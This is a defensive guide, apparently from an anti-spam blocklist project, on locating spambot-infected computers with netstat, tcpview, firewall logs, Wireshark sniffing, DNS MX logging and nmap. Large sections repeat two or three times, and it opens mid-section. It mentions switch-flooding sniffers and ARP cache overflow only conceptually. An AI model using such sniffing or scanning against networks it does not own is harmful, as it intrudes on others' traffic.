The ":25" under "Foreign Address" indicates an outbound SMTP connection.  "NNNN/name" under
"PID/Progran name" is the process id and process name of the offending program.
The large variety of "states" show that it's starting up/shutting down connections
very quickly.


Most if not all versions of Windows have a "netstat" DOS command.
One corporate security person once said "I haven't yet had netstat
fail to find an infected machine".


On Windows, use this in a dos command window:
netstat 5

This will give you a list of all network connections your machine
has open, much like *NIX netstat above every 5 seconds until you
stop it.
You're looking for very much the same sort of things as *NIX netstat
above.
You'll probably see Microsoft, Yahoo and other familiar names - they're
normal (from your browser, IM etc).
"Akamai" perhaps won't be familiar, but it's normal too.
Lots of port 25 connections is the usual sign of infection.


In *NIX etc, it's often enough to find the listed programs and remove it,
tho, that will not necessarily prevent you from being infected again.
Especially with Darkmailer.
Also with Darkmailer, you often won't be able to find the programs, because they
start up, delete themselves from the file system, and continue running in memory.


Note: you will usually see a lot more lines than the above that do not have ":25",
those are other non-email connections.
You might want to repeatedly pipe the output of "netstat -nap" through "grep :25"
to only see the SMTP connections.
":25" on the local address means an inbound connection.

"New files" in System Directories (Windows) [EASY]

Most infections "drop" their malicious programs in Windows "system" directories.
For example, the interesting directories on Windows/XP are C:\windows\system
and C:\windows\system32.


It's often possible to see these programs by navigating to the system directories,
switching to the "detailed view" and then sorting by date.
There is a good chance that the malicious software on your machine was created
within the past 30 days.
If you find programs in these directories that are that young, and aren't explainable
by a new software install or patch:



Google for the file name.  You may find a web page from a reputable
A/V vendor telling you what it is, whether it really is an infection
or a legitimate program, and how to remove it if it doesn't belong.


Run a series of A/V tools to try to remove them.


If none of the above fixes the problem, you may have to reinstall the machine.


Other Tools (Windows, per-machine)

There are a variety of other tools you can use on a per-machine
basis, but these are generally considerably more effort if you
have a lot of computers to check.



The MyNetwatchman Seccheck
tool [MODERATE-HARD] is one of the most advanced tools for identifying
what shouldn't be running on a PC.
This is something you will want to put on your USB key toolkit.
There are two versions of seccheck.
One is the "limited analysis" version which runs a scan, shows
you the result which you have to analyse yourself.
The "binary upload" version is prefered - it will upload suspicious
binary programs to MyNetwatchman which will result in the most
recent analysis.
If you run the "binary upload" version, you can contact the mNW
support mailbox, who will, time available, provide free assistance
in interpreting the result.


The 
Trend Micro Hijackthis
free tool [MODERATE-HARD] (another candidate for your USB key)
is quite popular.
Unlike seccheck, it doesn't perform any analysis at all.  It just
produces a report of what's running and has network connections.
The report has to be analysed to find out what it means.
As the Trend page says, there's a variety of online forums that
specialize in helping people analyze their hijackthis output.

The HijackThis.de Security
page has a place where you can upload your hijackthis output, and
it will produce automated analysis of the report.
It's not specialized for detecting spambots, it may find other things
instead.


The Microsoft Malicious Software Removal Tool (MSRT) [EASY]
is a free tool that runs on most versions of Windows and is a suitable
addition to your USB key toolkit.
Theoretically, this tool is highly specialized for finding and
removing current and common spambots.
But it's success rate is only partially better than general A/V tools
and it takes a long time to run.
Run tcpview first.


Important note: "full and most effective" use of seccheck and hijackthis
means that you're asking other people to provide you with free support.
A good analysis could take quite a while - that's a lot to ask of someone.
By all means use these tools on any/all of your machines, but
please only ask for analysis assistance on the one or
few machine[s] that appear suspicious.  In other words, don't send
dozens or hundreds of reports for expert analysis.  It isn't fair to them.

Centralized Detection
Firewall logging [EASY-HARD]

Many firewalls can be configured to log outbound port 25 connections.
If your firewall is logging such connections, you can usually identify
very quickly
the offending machine by lots of "mysterious" outbound port 25 connections.
Eg: non-mail servers making dozens or hundreds of outbound port 25
connections per minute.


Obviously, if your firewall doesn't support this kind of logging
(many inexpensive consumers-grade firewalls can't), this becomes pretty
hard to do.

Firewalls and UPNP
Universal Plug and Play (UPNP) is a feature of many routers
and gateways (particularly consumer equipment) that permits
computers on the local LAN to reconfigure the router.  These
are usually used by online games, certain VOIP hardware and
other things.

Certain spambots (Rustock in particular) use UPNP commands
to subvert port 25 blocking.


If your router/NAT supports UPNP, check to ensure that UPNP
logging is turned on.  You should be able to see log records
showing internal computers making UPNP changes.  Unless they're
legitimate applications, it's probably a spambot, likely Rustock.
Hopefully the log may show you the IP address of the infected
machine.


Make sure that UPNP is disabled unless you absolutely need it.

Port 25 sniffing [EASY-HARD]

This is listed as "EASY" if you have a hub-based network, or your
main router is a "managed switch".  It gets harder if you don't.


Port 25 sniffing is a powerful network diagnostic tool that when used
correctly can find just about any malicious machine or program.
They work by running a program on one of your machines with network set
to "promiscuous mode", which allows it to see and analyze all network
traffic on your LAN.  Just look for lots of port 25 connections coming
from machines that shouldn't be sending any or much email.

There are hardware and software sniffers available.
Hardware sniffers are fairly specialized equipment, and are often
too expensive for purposes like this.
Software sniffers are usually more practical.
The most popular and powerful software sniffer freely available is 
Wireshark, which runs
on *NIX, Windows and other systems.


Managed switches are sophisticated devices that usually have
"monitoring ports".  You can connect a computer with a sniffer
(especially a laptop) to the monitoring port and look directly for
the malicious traffic.


For a howto guide of how to use Wireshark, see
TechTarget.


Please read the discussion on
how to
set up a sniffer.
Note in particular, item 4 - "switched Ethernet" -
most networks are set up with switches these days,
and it makes it difficult to get sniffers to listen
to the whole network.
In section 4, think of "host A" as the infected
computer (you don't know what it is), and "Host B"
is the NAT.


The problem is that most relatively modern LAN networks are based upon "proper" routers
or network switches.  What this means is that each wire from the switch
to a given computer only carries the traffic for the IP corresponding
to that computer.  Not the rest of the LAN.
Hence, the sniffer sitting on a switched port only sees traffic to the
sniffer machine - useless.
Unless the router is a "managed switch" - the monitor port acts
as a hub connection.


With a hub, it doesn't know which wire is which, and sends a copy of
all packets down each port, so a sniffer on one of the ports can see
all traffic traversing the hub.


If your computers are connected together with hubs, it's easy, install
wireshark on one of the computers "near" the NAT and just start sniffing.


If you're unsure as to whether the sniffer is going to work for you
in your network, install wireshark, and from another computer, do "something"
to the Internet.
If you can't see the network traffic in the sniffer, you probably have
a switched network.
[If you're unsure of what to look for, install tcpview
on a machine and see what Internet connections it has open.  The
sniffer should be able to "see" those connections on the wire.]


In a switched network, you somehow have to get a non-switched drop (for the
sniffer machine) connected to the LAN segment that talks to your external
Internet connection.  Eg: on the wire between the NAT device (perhaps
a discrete firewall or your ADSL modem) and the rest of your LAN.
It must be on the LAN side of the NAT.


If you're lucky, you have a "monitoring" or "mirror port" on your
switch, or some other way of making one of the switch ports open.
Just attach the sniffer machine there.

Without a monitor port,
another way of solving this is to find a "ethernet hub".
Which is a simple device with several RJ45 network connectors,
and often doesn't even have a power supply.
You can often find these in computer stores used parts bins, and even 
brand new
one should cost less than $20.
Just be sure it's an "ethernet hub", not an "ethernet switch".
If in doubt, ask the salesperson.  If the salesperson doesn't know,
check the Internet.
Connect the hub between your NAT and the rest of the network, then connect
your sniffer machine to one of the other hub ports.
This is the "hubbing out" diagram.


Note that if your NAT gateway is an integrated firewall/router this
can be problemmatic.
In such cases, you'll have to rely on firewall rules and logs instead
of a sniffer, or add a cheap switch (1Gb switches are < $40)
for all of your computers.
From the switch, you run a line to the hub, and from the hub
to your firewall/router, with the sniffer hanging off one of the hub
ports.


[This author has a Dlink wireless 4 port router (100Mb) implementing the
NAT connection to the Internet modem and wireless connections.
Only one of the Dlink's LAN ports is used - it connects to a 1000Mb
switch, where all the wired computers connect to.
This was cheaper than upgrading the wireless router to allow the higher speed
wired machines to talk at 1000Mb.
If a sniffer was necessary, it would be connected via an old 10Mb passive hub
between the switch and the router - no particular performance penalty, because
essentially the only traffic going through this link is to the Internet, and
the author's Internet connection isn't that fast.
This doesn't necessarily help sniff the wireless connections, however,
machines could be moved to wired connections for testing.]


There are network sniffers that can trick switches into behaving like hubs.
Eg: the "dsniff" sniffer - see the 
Capture using a MITM (Man-In-The-Middle) software for more detail.
Take special note of the warnings -
use with caution.

Command and Control Detection [MODERATE-HARD]

Spambots are controlled by criminals (botmasters)
in a variety of different ways,
which can be differentiated in the following ways based on who
connects to what, and how they can be detected:


The methods we describe below won't always be terribly useful, but
if you have a sniffer working properly, they won't take much time
to try, and you may get lucky.


Inbound control
is where there is a botmaster who
knows that a particular IP is infected, establishes a connection
to that IP address and uses a specialized bot control protocol to
"tell" the infected computer what to do.
This includes some BOTs and other things like "open proxies".

Behind a NAT firewall, these are generally not a big problem because
a computer on the Internet can't connect to an arbitrary computer
behind a NAT.
The NAT has to be explicitly configured to allow specific inbound
connections to internal machines (eg: mail and web servers).
So, normal "infected end-user machines" generally can't be controlled
this way.
This is the province of specialized infections like Darkmailer which
hacks into web servers and uses them as spam cannons.

More info TBD.

Outbound control
The majority of infestations the CBL detects are where the infected
computer makes long-lived or multiple short-lived connections to
a "command and control" (C&C) server somewhere in the Internet.
The C&C server replies to these connections with sets of instructions
of what to do (eg: contents of email, message templates, and lists
of email addresses to spam).

Many older BOTs (and a few current ones) use IRC - the infected computer
makes a connection to an IRC server, and the IRC server responds with
commands.
One BOT that does is called "MIRCbot".
If you have a sniffer, simply looking for IRC connections that you're
not expecting (port 6666) will find both the C&C and the infected computer.
As a best practise, it's usually best to block outbound IRC connections
at your firewall unless you have users that really need to use IRC.
The Instant Messaging protocols (eg: MSN, AOL/AIM, Yahoo and Jabber
based protocols) are generally not a problem in this way.


Newer BOTs use more sophisticated command and control protocols.
You have to know exactly which bot you're looking for, and be
deeply involved in the anti-virus research community to know exactly
what to look for.  In many cases, BOTs use random port numbers,
or "common" ones, so either you don't know "where" it is, or, it's mixed
in with lots of legitimate traffic, so you can't tell which connections
are good and which ones are bad.


All is not lost however.  With a sniffer, you can try looking for
outbound connections to unusually high numbered ports (eg: >10,000).
In small environments, you could get everyone to shut down their web
browsers, and watch for port 80, 8080, and 443 (all web based)
connections when they shouldn't be made.
If you find web connections when the source of the connection doesn't
have a browser or mail reader running, there's a good chance you've
found the infected machine - the machines to first run a toolkit
tool like tcpview on.


In a relatively small environment, you may get a "feeling" for the
IP addresses the sniffer is showing you as the destination.
Eg: if you're in North America, seeing connections to IP addreses
beginning with 200, 201, 202, 203, 59, 88, 89 etc, will mean that
the computer is making connections to Asia or Europe.  Especially
if the local computer is idle, why is it making connections there?
Again, a job for tcpview.


Odd DNS MX query sources [MODERATE-HARD]

To send email, virtually all BOTs have to issue DNS MX queries
to find how to deliver their spam/viruses.
Under normal circumstances, ONLY your mail server[s], your DNS server[s]
(if any) should be issuing MX queries.
Web servers that do direct-to-recipient emailing will do MX queries
too, but this is generally unwise, and you should force your web server's
email through your main mail server.


End user computers generally do NOT have to issue MX queries - they
just hand the email off to your mail server (by explicit "smarthost",
"relay", "smtp server" or "outbound mail server" settings),
which will require an A record but not MX record lookup).


This means that a BOT sending lots of spam will do lots of MX queries.
If you find a end-user computer or some other computer that shouldn't be
doing email at all doing MX queries (especially lots of them), you've found
the infected computer[s].


If you have your own DNS server (eg: a DNS cache), you should be
able to get the DNS server to give you basic statistics of who is
issuing MX queries to them.  If you don't have your own DNS server,
you could look for unusual sources of DNS MX queries via a sniffer.
It may be easier to sniff all DNS traffic going to your DNS server than
your firewall.


Note some BOTs undoubtably use their own DNS servers, and ignore your local
settings.
In which case, you'd have to be able to sniff all 
Internet-bound traffic looking for DNS traffic not coming from your DNS
cache.


Note: it's probably a good idea to configure your firewall
to only allow your DNS cache to send/receive DNS packets (UDP port 53)
to/from the Internet.
This has a number of benefits, including disabling some bots, and
completely disrupting DNS hijacking attacks, which are becoming a major
hazard on the Internet (phishing, man-in-the-middle bank account attacks etc).
This is fairly easy to do if you allocate most IPs via DHCP, but you
will have to remember to check the DNS server settings on your static IP
computers.
However, in large ad-hoc networks this may be impractical to implement - too
much work fixing computer DNS settings.


Configuring DNS servers to yield detailed per-IP metrics is beyond the scope
of this page.  See the documentation for your DNS server.
However, a team member provided this configuration snippet on how
to make BIND log queries:

logging {
        channel "logger" {
                file "/var/log/named.log" versions 3 size 5m;
                severity debug 5;
                print-time yes;
                print-category yes;
        };
        category queries {
                 "logger";
        };
};


This will log all (not just MX) queries in /var/log/named.log, example:

28-Jul-2009 15:07:09.206 queries: client 192.168.13.100#59889: query: somebody.com IN MX +


You could then issue "grep MX /var/log/named.log" and see if some
unexpected IP address is doing a lot of MX queries.
See BIND
for more information on logging options.

Lots of DNS NXDOMAINs [MODERATE-HARD]

Some BOTs (eg: Conficker) use DNS to periodically find their command-and-control
(C&C) servers.
In some cases, some of the C&Cs have been taken down, or, the BOT uses time-based
algorithms to compute the names before the domain name is registered.


As a consequence such BOTS will do DNS A record queries in bursts, and
often get a lot of "no such name" (NXDOMAIN) responses.
Lots of "NXDOMAIN" isn't normal behaviour, particularly for end-user computers.
This can most often be found if you have your own DNS server - see previous
section about setting up logging.

Port Scanners [EASY-MODERATE]

Back in the days before "outbound controlled BOTs",
port scanners were frequently used to scan your own computers to see
what ports are open.  In this way you could often find the port
on which the BOT was listening, or determine that the computer was
offering services it didn't need to, and turn them off.


Port scanners are of relatively little use with more
modern spambots - the infection is not listening for inbound
C&C connections, it makes the connections itself outbound.  Secondly,
with NATs, the C&C server couldn't reach the infected computer
anyway.


However, sometimes you get lucky.
Some bots have provisions for multiple C&C methods, or install
open proxies or..., these a port scanner can find.


The most common/popular port scanner is the venerable
Nmap tool.  It's free, and runs
on just about anything.


But first, two warnings: 


ONLY SCAN YOUR OWN MACHINES!
Scanning other people's computers is considered a hostile act,
and can result in complaints to your ISP or worse.
So don't even think about it.


You really only should use port scanners if you're the boss,
or part of your company's security or IT department.
It's a good idea to warn management or security first.
Sometimes issuing port scans will set off alarms and in some
unusual situations can cause processing disruptions.
Better that your colleague's response is "Oh that's just the port scan"
than "we're hacked, call the police!"



Detailed description of how to use nmap is well beyond the scope
of this paper.
For our purposes, the following command will do most of
what you want and be non-destructive - won't do any damage:
nmap -A [machine or network specification]


For machine specification, you can just give the machine's name.
To scan an entire network, say, all of 192.168.0.0-192.168.0.255,
use "192.168.0.0/24".

The above command will show what ports are open (and
thus listening), and usually what they're used for.
Most machines should only be listening on a few.  Listening
on ports >1024 and/or that don't have a "name" under SERVICE are
suspicious and require closer looking at.
Machines that shouldn't have a web server listening on ports
80, 8080 are worth looking at.
Machines that shouldn't be running services at all should
be looked at.
tcpview or "netstat -nap" can be used on the machine to find out
what's listening on that port.

End Notes

ARP packets are special low-level packets that
devices use to tell switches and other computers "where" they are.
Essentially, it says "Here I am, my MAC (hardware address of Ethernet
device) is X and my IP is Y".
A Network switch sees these packets coming in on one of its ports,
and assigns the MAC and IP to a specific port/wire/computer.
Then, when it sees a request to send a packet to that IP, it knows
which port/wire/computer to send it to.
These assignments are kept in the switch's "ARP cache".
ARP caches are of limited size.  So, if a device deliberately floods
it with lots of ARP packets with random faked MAC addresses, the ARP
cache overflows, and the switch can only continue operation by sending
every packet down every interface.




When a connection is freshly established, the corresponding line is green.  When
the connection ends, it's shown in red briefly before disppearing.

If you have found the machine with a high volume bot, which could be
sending dozens or hundreds of emails per minute, the display will light up like a
christmas tree with large numbers of green ":smtp" lines appearing and red ":smtp"
lines disappearing very rapidly.
The bot may be deliberately slow, and only send emails sporadically.  So watch
the display for a few minutes to see if any ":smtp" lines show up and disappear.

If you find the machine with the bot showing up on tcpview, the temptation is
strong to simply delete the corresponding program.
Don't.
Chances are high that it's an infection inside a legitimate windows program -
deleting it will cripple the machine, or, that there is software in place to
replace it after you have removed it.

Instead, obtain and run as many anti-virus programs as you can, and see if any
detect or remove it.
After this, reboot the machine, and run tcpview again.  Watch it for a while.
If the problem recurs, you will have to reinstall the computer from scratch.

Note: There are a few bots this won't work with - Srizbi and Xarvester have their
own TCP stacks, and it's believed that tcpview won't see their activity.

Netstat is similar in intent to the tcpvcon version of tcpview, and is standard
on most versions of *NIX - it's been around for decades.
Secondly, most versions of Windows have it.
The main difference with tcpview is that netstat is a command line function
that takes a single snapshot of current connections.

In many versions of netstat, the most effective command line to use is:

Which could, in the case of Darkmailer, show an active infection like this:

The ":25" under "Foreign Address" indicates an outbound SMTP connection.  "NNNN/name" under
"PID/Progran name" is the process id and process name of the offending program.
The large variety of "states" show that it's starting up/shutting down connections
very quickly.

Most if not all versions of Windows have a "netstat" DOS command.
One corporate security person once said "I haven't yet had netstat
fail to find an infected machine".

On Windows, use this in a dos command window:
netstat 5

This will give you a list of all network connections your machine
has open, much like *NIX netstat above every 5 seconds until you
stop it.
You're looking for very much the same sort of things as *NIX netstat
above.
You'll probably see Microsoft, Yahoo and other familiar names - they're
normal (from your browser, IM etc).
"Akamai" perhaps won't be familiar, but it's normal too.
Lots of port 25 connections is the usual sign of infection.

In *NIX etc, it's often enough to find the listed programs and remove it,
tho, that will not necessarily prevent you from being infected again.
Especially with Darkmailer.
Also with Darkmailer, you often won't be able to find the programs, because they
start up, delete themselves from the file system, and continue running in memory.

Note: you will usually see a lot more lines than the above that do not have ":25",
those are other non-email connections.
You might want to repeatedly pipe the output of "netstat -nap" through "grep :25"
to only see the SMTP connections.
":25" on the local address means an inbound connection.

Most infections "drop" their malicious programs in Windows "system" directories.
For example, the interesting directories on Windows/XP are C:\windows\system
and C:\windows\system32.

It's often possible to see these programs by navigating to the system directories,
switching to the "detailed view" and then sorting by date.
There is a good chance that the malicious software on your machine was created
within the past 30 days.
If you find programs in these directories that are that young, and aren't explainable
by a new software install or patch:

There are a variety of other tools you can use on a per-machine
basis, but these are generally considerably more effort if you
have a lot of computers to check.

The HijackThis.de Security
page has a place where you can upload your hijackthis output, and
it will produce automated analysis of the report.
It's not specialized for detecting spambots, it may find other things
instead.

Important note: "full and most effective" use of seccheck and hijackthis
means that you're asking other people to provide you with free support.
A good analysis could take quite a while - that's a lot to ask of someone.
By all means use these tools on any/all of your machines, but
please only ask for analysis assistance on the one or
few machine[s] that appear suspicious.  In other words, don't send
dozens or hundreds of reports for expert analysis.  It isn't fair to them.

Many firewalls can be configured to log outbound port 25 connections.
If your firewall is logging such connections, you can usually identify
very quickly
the offending machine by lots of "mysterious" outbound port 25 connections.
Eg: non-mail servers making dozens or hundreds of outbound port 25
connections per minute.

Obviously, if your firewall doesn't support this kind of logging
(many inexpensive consumers-grade firewalls can't), this becomes pretty
hard to do.

Certain spambots (Rustock in particular) use UPNP commands
to subvert port 25 blocking.

If your router/NAT supports UPNP, check to ensure that UPNP
logging is turned on.  You should be able to see log records
showing internal computers making UPNP changes.  Unless they're
legitimate applications, it's probably a spambot, likely Rustock.
Hopefully the log may show you the IP address of the infected
machine.

Make sure that UPNP is disabled unless you absolutely need it.

This is listed as "EASY" if you have a hub-based network, or your
main router is a "managed switch".  It gets harder if you don't.

Port 25 sniffing is a powerful network diagnostic tool that when used
correctly can find just about any malicious machine or program.
They work by running a program on one of your machines with network set
to "promiscuous mode", which allows it to see and analyze all network
traffic on your LAN.  Just look for lots of port 25 connections coming
from machines that shouldn't be sending any or much email.

There are hardware and software sniffers available.
Hardware sniffers are fairly specialized equipment, and are often
too expensive for purposes like this.
Software sniffers are usually more practical.
The most popular and powerful software sniffer freely available is 
Wireshark, which runs
on *NIX, Windows and other systems.


Managed switches are sophisticated devices that usually have
"monitoring ports".  You can connect a computer with a sniffer
(especially a laptop) to the monitoring port and look directly for
the malicious traffic.


For a howto guide of how to use Wireshark, see
TechTarget.


Please read the discussion on
how to
set up a sniffer.
Note in particular, item 4 - "switched Ethernet" -
most networks are set up with switches these days,
and it makes it difficult to get sniffers to listen
to the whole network.
In section 4, think of "host A" as the infected
computer (you don't know what it is), and "Host B"
is the NAT.


The problem is that most relatively modern LAN networks are based upon "proper" routers
or network switches.  What this means is that each wire from the switch
to a given computer only carries the traffic for the IP corresponding
to that computer.  Not the rest of the LAN.
Hence, the sniffer sitting on a switched port only sees traffic to the
sniffer machine - useless.
Unless the router is a "managed switch" - the monitor port acts
as a hub connection.


With a hub, it doesn't know which wire is which, and sends a copy of
all packets down each port, so a sniffer on one of the ports can see
all traffic traversing the hub.


If your computers are connected together with hubs, it's easy, install
wireshark on one of the computers "near" the NAT and just start sniffing.


If you're unsure as to whether the sniffer is going to work for you
in your network, install wireshark, and from another computer, do "something"
to the Internet.
If you can't see the network traffic in the sniffer, you probably have
a switched network.
[If you're unsure of what to look for, install tcpview
on a machine and see what Internet connections it has open.  The
sniffer should be able to "see" those connections on the wire.]


In a switched network, you somehow have to get a non-switched drop (for the
sniffer machine) connected to the LAN segment that talks to your external
Internet connection.  Eg: on the wire between the NAT device (perhaps
a discrete firewall or your ADSL modem) and the rest of your LAN.
It must be on the LAN side of the NAT.


If you're lucky, you have a "monitoring" or "mirror port" on your
switch, or some other way of making one of the switch ports open.
Just attach the sniffer machine there.

Without a monitor port,
another way of solving this is to find a "ethernet hub".
Which is a simple device with several RJ45 network connectors,
and often doesn't even have a power supply.
You can often find these in computer stores used parts bins, and even 
brand new
one should cost less than $20.
Just be sure it's an "ethernet hub", not an "ethernet switch".
If in doubt, ask the salesperson.  If the salesperson doesn't know,
check the Internet.
Connect the hub between your NAT and the rest of the network, then connect
your sniffer machine to one of the other hub ports.
This is the "hubbing out" diagram.


Note that if your NAT gateway is an integrated firewall/router this
can be problemmatic.
In such cases, you'll have to rely on firewall rules and logs instead
of a sniffer, or add a cheap switch (1Gb switches are < $40)
for all of your computers.
From the switch, you run a line to the hub, and from the hub
to your firewall/router, with the sniffer hanging off one of the hub
ports.


[This author has a Dlink wireless 4 port router (100Mb) implementing the
NAT connection to the Internet modem and wireless connections.
Only one of the Dlink's LAN ports is used - it connects to a 1000Mb
switch, where all the wired computers connect to.
This was cheaper than upgrading the wireless router to allow the higher speed
wired machines to talk at 1000Mb.
If a sniffer was necessary, it would be connected via an old 10Mb passive hub
between the switch and the router - no particular performance penalty, because
essentially the only traffic going through this link is to the Internet, and
the author's Internet connection isn't that fast.
This doesn't necessarily help sniff the wireless connections, however,
machines could be moved to wired connections for testing.]


There are network sniffers that can trick switches into behaving like hubs.
Eg: the "dsniff" sniffer - see the 
Capture using a MITM (Man-In-The-Middle) software for more detail.
Take special note of the warnings -
use with caution.

Command and Control Detection [MODERATE-HARD]

Spambots are controlled by criminals (botmasters)
in a variety of different ways,
which can be differentiated in the following ways based on who
connects to what, and how they can be detected:


The methods we describe below won't always be terribly useful, but
if you have a sniffer working properly, they won't take much time
to try, and you may get lucky.


Inbound control
is where there is a botmaster who
knows that a particular IP is infected, establishes a connection
to that IP address and uses a specialized bot control protocol to
"tell" the infected computer what to do.
This includes some BOTs and other things like "open proxies".

Behind a NAT firewall, these are generally not a big problem because
a computer on the Internet can't connect to an arbitrary computer
behind a NAT.
The NAT has to be explicitly configured to allow specific inbound
connections to internal machines (eg: mail and web servers).
So, normal "infected end-user machines" generally can't be controlled
this way.
This is the province of specialized infections like Darkmailer which
hacks into web servers and uses them as spam cannons.

More info TBD.

Outbound control
The majority of infestations the CBL detects are where the infected
computer makes long-lived or multiple short-lived connections to
a "command and control" (C&C) server somewhere in the Internet.
The C&C server replies to these connections with sets of instructions
of what to do (eg: contents of email, message templates, and lists
of email addresses to spam).

Many older BOTs (and a few current ones) use IRC - the infected computer
makes a connection to an IRC server, and the IRC server responds with
commands.
One BOT that does is called "MIRCbot".
If you have a sniffer, simply looking for IRC connections that you're
not expecting (port 6666) will find both the C&C and the infected computer.
As a best practise, it's usually best to block outbound IRC connections
at your firewall unless you have users that really need to use IRC.
The Instant Messaging protocols (eg: MSN, AOL/AIM, Yahoo and Jabber
based protocols) are generally not a problem in this way.


Newer BOTs use more sophisticated command and control protocols.
You have to know exactly which bot you're looking for, and be
deeply involved in the anti-virus research community to know exactly
what to look for.  In many cases, BOTs use random port numbers,
or "common" ones, so either you don't know "where" it is, or, it's mixed
in with lots of legitimate traffic, so you can't tell which connections
are good and which ones are bad.


All is not lost however.  With a sniffer, you can try looking for
outbound connections to unusually high numbered ports (eg: >10,000).
In small environments, you could get everyone to shut down their web
browsers, and watch for port 80, 8080, and 443 (all web based)
connections when they shouldn't be made.
If you find web connections when the source of the connection doesn't
have a browser or mail reader running, there's a good chance you've
found the infected machine - the machines to first run a toolkit
tool like tcpview on.


In a relatively small environment, you may get a "feeling" for the
IP addresses the sniffer is showing you as the destination.
Eg: if you're in North America, seeing connections to IP addreses
beginning with 200, 201, 202, 203, 59, 88, 89 etc, will mean that
the computer is making connections to Asia or Europe.  Especially
if the local computer is idle, why is it making connections there?
Again, a job for tcpview.


Odd DNS MX query sources [MODERATE-HARD]

To send email, virtually all BOTs have to issue DNS MX queries
to find how to deliver their spam/viruses.
Under normal circumstances, ONLY your mail server[s], your DNS server[s]
(if any) should be issuing MX queries.
Web servers that do direct-to-recipient emailing will do MX queries
too, but this is generally unwise, and you should force your web server's
email through your main mail server.


End user computers generally do NOT have to issue MX queries - they
just hand the email off to your mail server (by explicit "smarthost",
"relay", "smtp server" or "outbound mail server" settings),
which will require an A record but not MX record lookup).


This means that a BOT sending lots of spam will do lots of MX queries.
If you find a end-user computer or some other computer that shouldn't be
doing email at all doing MX queries (especially lots of them), you've found
the infected computer[s].


If you have your own DNS server (eg: a DNS cache), you should be
able to get the DNS server to give you basic statistics of who is
issuing MX queries to them.  If you don't have your own DNS server,
you could look for unusual sources of DNS MX queries via a sniffer.
It may be easier to sniff all DNS traffic going to your DNS server than
your firewall.


Note some BOTs undoubtably use their own DNS servers, and ignore your local
settings.
In which case, you'd have to be able to sniff all 
Internet-bound traffic looking for DNS traffic not coming from your DNS
cache.


Note: it's probably a good idea to configure your firewall
to only allow your DNS cache to send/receive DNS packets (UDP port 53)
to/from the Internet.
This has a number of benefits, including disabling some bots, and
completely disrupting DNS hijacking attacks, which are becoming a major
hazard on the Internet (phishing, man-in-the-middle bank account attacks etc).
This is fairly easy to do if you allocate most IPs via DHCP, but you
will have to remember to check the DNS server settings on your static IP
computers.
However, in large ad-hoc networks this may be impractical to implement - too
much work fixing computer DNS settings.


Configuring DNS servers to yield detailed per-IP metrics is beyond the scope
of this page.  See the documentation for your DNS server.
However, a team member provided this configuration snippet on how
to make BIND log queries:

logging {
        channel "logger" {
                file "/var/log/named.log" versions 3 size 5m;
                severity debug 5;
                print-time yes;
                print-category yes;
        };
        category queries {
                 "logger";
        };
};


This will log all (not just MX) queries in /var/log/named.log, example:

28-Jul-2009 15:07:09.206 queries: client 192.168.13.100#59889: query: somebody.com IN MX +


You could then issue "grep MX /var/log/named.log" and see if some
unexpected IP address is doing a lot of MX queries.
See BIND
for more information on logging options.

Lots of DNS NXDOMAINs [MODERATE-HARD]

Some BOTs (eg: Conficker) use DNS to periodically find their command-and-control
(C&C) servers.
In some cases, some of the C&Cs have been taken down, or, the BOT uses time-based
algorithms to compute the names before the domain name is registered.


As a consequence such BOTS will do DNS A record queries in bursts, and
often get a lot of "no such name" (NXDOMAIN) responses.
Lots of "NXDOMAIN" isn't normal behaviour, particularly for end-user computers.
This can most often be found if you have your own DNS server - see previous
section about setting up logging.

Port Scanners [EASY-MODERATE]

Back in the days before "outbound controlled BOTs",
port scanners were frequently used to scan your own computers to see
what ports are open.  In this way you could often find the port
on which the BOT was listening, or determine that the computer was
offering services it didn't need to, and turn them off.


Port scanners are of relatively little use with more
modern spambots - the infection is not listening for inbound
C&C connections, it makes the connections itself outbound.  Secondly,
with NATs, the C&C server couldn't reach the infected computer
anyway.


However, sometimes you get lucky.
Some bots have provisions for multiple C&C methods, or install
open proxies or..., these a port scanner can find.


The most common/popular port scanner is the venerable
Nmap tool.  It's free, and runs
on just about anything.


But first, two warnings: 


ONLY SCAN YOUR OWN MACHINES!
Scanning other people's computers is considered a hostile act,
and can result in complaints to your ISP or worse.
So don't even think about it.


You really only should use port scanners if you're the boss,
or part of your company's security or IT department.
It's a good idea to warn management or security first.
Sometimes issuing port scans will set off alarms and in some
unusual situations can cause processing disruptions.
Better that your colleague's response is "Oh that's just the port scan"
than "we're hacked, call the police!"



Detailed description of how to use nmap is well beyond the scope
of this paper.
For our purposes, the following command will do most of
what you want and be non-destructive - won't do any damage:
nmap -A [machine or network specification]


For machine specification, you can just give the machine's name.
To scan an entire network, say, all of 192.168.0.0-192.168.0.255,
use "192.168.0.0/24".

The above command will show what ports are open (and
thus listening), and usually what they're used for.
Most machines should only be listening on a few.  Listening
on ports >1024 and/or that don't have a "name" under SERVICE are
suspicious and require closer looking at.
Machines that shouldn't have a web server listening on ports
80, 8080 are worth looking at.
Machines that shouldn't be running services at all should
be looked at.
tcpview or "netstat -nap" can be used on the machine to find out
what's listening on that port.

End Notes

ARP packets are special low-level packets that
devices use to tell switches and other computers "where" they are.
Essentially, it says "Here I am, my MAC (hardware address of Ethernet
device) is X and my IP is Y".
A Network switch sees these packets coming in on one of its ports,
and assigns the MAC and IP to a specific port/wire/computer.
Then, when it sees a request to send a packet to that IP, it knows
which port/wire/computer to send it to.
These assignments are kept in the switch's "ARP cache".
ARP caches are of limited size.  So, if a device deliberately floods
it with lots of ARP packets with random faked MAC addresses, the ARP
cache overflows, and the switch can only continue operation by sending
every packet down every interface.




There are hardware and software sniffers available.
Hardware sniffers are fairly specialized equipment, and are often
too expensive for purposes like this.
Software sniffers are usually more practical.
The most popular and powerful software sniffer freely available is 
Wireshark, which runs
on *NIX, Windows and other systems.

Managed switches are sophisticated devices that usually have
"monitoring ports".  You can connect a computer with a sniffer
(especially a laptop) to the monitoring port and look directly for
the malicious traffic.

For a howto guide of how to use Wireshark, see
TechTarget.

Please read the discussion on
how to
set up a sniffer.
Note in particular, item 4 - "switched Ethernet" -
most networks are set up with switches these days,
and it makes it difficult to get sniffers to listen
to the whole network.
In section 4, think of "host A" as the infected
computer (you don't know what it is), and "Host B"
is the NAT.

The problem is that most relatively modern LAN networks are based upon "proper" routers
or network switches.  What this means is that each wire from the switch
to a given computer only carries the traffic for the IP corresponding
to that computer.  Not the rest of the LAN.
Hence, the sniffer sitting on a switched port only sees traffic to the
sniffer machine - useless.
Unless the router is a "managed switch" - the monitor port acts
as a hub connection.

With a hub, it doesn't know which wire is which, and sends a copy of
all packets down each port, so a sniffer on one of the ports can see
all traffic traversing the hub.

